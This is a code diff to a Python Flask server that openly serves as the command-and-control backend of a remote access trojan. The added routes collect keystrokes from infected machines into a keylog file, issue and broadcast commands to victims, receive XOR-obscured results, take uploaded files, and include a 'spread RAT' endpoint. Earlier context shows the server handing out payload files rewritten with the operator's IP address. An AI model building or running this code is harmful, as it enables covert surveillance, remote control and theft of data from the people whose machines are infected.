@@ -19,6 +19,7 @@ os.makedirs(UPLOAD_DIR, exist_ok=True)
 available_code_files = [f for f in os.listdir(CODE_DIR) if os.path.isfile(os.path.join(CODE_DIR, f))]
 selected_code_file = None
 
+
 def info():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(" ░█████╗░░██████╗██╗░░██╗██╗░░░██╗███████╗██╗██╗░░░░░")
@@ -28,6 +29,7 @@ def info():
     print("  ██║░░██║██████╔╝██║░░██║░░╚██╔╝░░███████╗██║███████╗")
     print("  ╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚══════╝")
     time.sleep(0.5)
+
 
 def adjust_payload():
     global forwarded, available_code_files
@@ -52,6 +54,7 @@ def adjust_payload():
             file.write(new_content)
 
         print(f"[*] Adjusted URL in {file_name} to {ip_address}")
+
 
 def ask_if_forwarded():
     global forwarded  # Make sure we're modifying the global variable
@@ -97,6 +100,8 @@ def ask_if_forwarded():
             print("No selection made. Exiting...")
             exit(0)  # Exit the program if no selection is made
 
+
+
 # ==== Interactive Blessed Menu ====
 def choose_code_file():
     global selected_code_file
@@ -137,6 +142,7 @@ def choose_code_file():
                     time.sleep(1)
                     break
 
+
 # ==== Flask Routes ====
 @app.route("/code")
 def serve_code():
@@ -148,6 +154,7 @@ def serve_code():
     except Exception as e:
         return f"Error reading file: {str(e)}", 500
 
+
 @app.route('/install', methods=['GET'])
 def download_v2():
     try:
@@ -157,6 +164,7 @@ def download_v2():
         return send_from_directory(CURRENT_DIR, FILE_NAME, as_attachment=True)
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
+
 
 @app.route('/clean', methods=['GET'])
 def clean():
@@ -168,8 +176,100 @@ def clean():
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
+def xor(data, key="nullbeacon"):
+    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
+
+# ==== Client State ====
+clients = {}
+current_cmd = ""
+last_result = ""
+
+@app.route('/log', methods=['POST'])
+def log():
+    raw_data = request.form.get("data", "")
+    
+    # Just log the raw data without timestamp
+    with open("keylog.log", "a", encoding="utf-8") as f:
+        f.write(raw_data)  # Ensure no extra newline is added here
+
+    return "OK", 200
+
+@app.route('/client_info', methods=['POST'])
+def update_client_info():
+    client_id = request.data.decode()
+    clients[client_id] = {"ip": request.remote_addr, "last_seen": time.time()}
+    print(f"[*] Client {client_id} updated or connected.")
+    return "OK"
+
+
+@app.route('/get', methods=['GET'])
+def get_command():
+    return current_cmd
+
+
+@app.route('/set', methods=['POST'])
+def set_command():
+    global current_cmd
+    current_cmd = request.data.decode()
+    return "OK"
+
+
+@app.route('/result', methods=['POST'])
+def post_result():
+    global last_result
+    encrypted = request.data.decode()
+    last_result = xor(encrypted)
+    return "OK"
+
+
+@app.route('/last', methods=['GET'])
+def get_last_result():
+    return last_result or "[*] No result yet."
+
+
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    file = request.files.get('file')
+    if file:
+        path = os.path.join(UPLOAD_DIR, file.filename)
+        file.save(path)
+        print(f"[+] File uploaded: {file.filename}")
+        return "OK"
+    return "No file"
+
+
+@app.route('/broadcast', methods=['POST'])
+def broadcast_command():
+    global current_cmd
+    cmd = request.data.decode()
+    current_cmd = cmd
+    print(f"[!] Broadcasting command to all clients: {cmd}")
+    return "Broadcast sent"
+
+
+@app.route('/download/<filename>', methods=['GET'])
+def download_file(filename):
+    try:
+        return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)
+    except Exception:
+        return "File not found", 404
+
+
+@app.route('/spread', methods=['POST'])
+def spread():
+    print("[*] Command received to spread RAT to all clients.")
+    for client_id, client_data in clients.items():
+        print(f"[+] Sending 'spread' command to {client_id} at {client_data['ip']}")
+    return "Spreading started."
+
+
+@app.route('/clients', methods=['GET'])
+def list_clients():
+    return {"clients": list(clients.keys())}
+
 # ==== Run Server ====
 if __name__ == "__main__":
+
     info()
     ask_if_forwarded()  # Ask if port is forwarded
     adjust_payload()  # Adjust all payload files based on forwarding status
